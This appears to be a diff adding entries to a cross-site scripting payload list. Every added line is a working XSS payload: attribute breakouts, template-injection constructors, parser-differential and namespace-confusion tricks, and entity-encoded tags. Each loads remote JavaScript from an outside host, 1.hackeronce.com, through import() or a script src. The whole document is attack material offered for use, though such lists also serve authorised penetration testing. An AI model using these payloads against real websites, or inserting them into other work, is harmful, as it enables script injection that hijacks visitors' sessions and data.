@@ -77,3 +77,56 @@ Tab Onload
 ';"><svg></style></noscript></script></title></textarea><%09svg/onload=import('//1.hackeronce.com/jules')>
 Newline Onload
 ';"><svg></style></noscript></script></title></textarea><%0Asvg/onload=import('//1.hackeronce.com/jules')>
+
+# Payloads from SonarSource Blog and other sources
+
+# Breaking out of attributes
+';"><svg></style></noscript></script></title></textarea><script src=//1.hackeronce.com></script>
+';"><svg></style></noscript></script></title></textarea>"><script src=//1.hackeronce.com></script>
+';"><svg></style></noscript></script></title></textarea>"><script src=//1.hackeronce.com></script><x="
+';"><svg></style></noscript></script></title></textarea>$.getScript("//1.hackeronce.com")
+';"><svg></style></noscript></script></title></textarea>"><img src onerror=import('//1.hackeronce.com')>
+';"><svg></style></noscript></script></title></textarea>"><img/src/onerror=import('//1.hackeronce.com')>
+';"><svg></style></noscript></script></title></textarea>"><svg><script href=//1.hackeronce.com />
+';"><svg></style></noscript></script></title></textarea>"><svg/onload=import('//1.hackeronce.com')>
+';"><svg></style></noscript></script></title></textarea>javascript:import('//1.hackeronce.com')
+';"><svg></style></noscript></script></title></textarea>{{_openBlock.constructor('import("//1.hackeronce.com")')()}}
+';"><svg></style></noscript></script></title></textarea>{{constructor.constructor('import("//1.hackeronce.com")')()}}
+';"><svg></style></noscript></script></title></textarea>javascript:eval('var a=document.createElement(\'script\');a.src=\'//1.hackeronce.com\';document.body.appendChild(a)')
+';"><svg></style></noscript></script></title></textarea>document.head.appendChild(Object.assign(document.createElement('script'),{src:'//1.hackeronce.com'}));
+
+# Less Common Event Handlers with import
+"><input autofocus onfocus=import('//1.hackeronce.com')>
+"><details open ontoggle=import('//1.hackeronce.com')>
+"><p onpointerenter=import('//1.hackeronce.com')>Please read this</p>
+
+# Breaking the Regex with unconventional whitespace
+<svg/onload%0A=import('//1.hackeronce.com')>
+<svg/onload%00/=import('//1.hackeronce.com')>
+<img src=x onerror="import('//1.hackeronce.com')"
+
+# Junk import
+';import('//1.hackeronce.com/jules');//
+
+# Namespace Confusion (SVG/Math)
+"><svg><style><a alt="</style><img src=x onerror=import('//1.hackeronce.com')>">
+<math><style><a alt="</style><img src=x onerror=import('//1.hackeronce.com/jules')>">
+<svg><html><img src=x onerror=import('//1.hackeronce.com/jules')>
+
+# Parser Differentials (noscript)
+<noscript><style></noscript><img src=x onerror="import('//1.hackeronce.com')">
+<noscript><style></noscript><img src=x onerror="import('//1.hackeronce.com/jules')">
+
+# Parsing Round-Trip (Nested Forms)
+<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=import('//1.hackeronce.com')>
+<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=import('//1.hackeronce.com/jules')>
+
+# Template tag
+<template><img src=x onerror=import('//1.hackeronce.com/jules')></template>
+
+# MathML
+<math xmlns="http://www.w3.org/1998/Math/MathML"><mtext><script>import('//1.hackeronce.com/jules')</script></mtext></math>
+
+# Decimal/Hex Entities
+&#60;img src=x onerror=import('//1.hackeronce.com/jules')&#62;
+&#x3C;svg/onload=import('//1.hackeronce.com/jules')&#x3E;
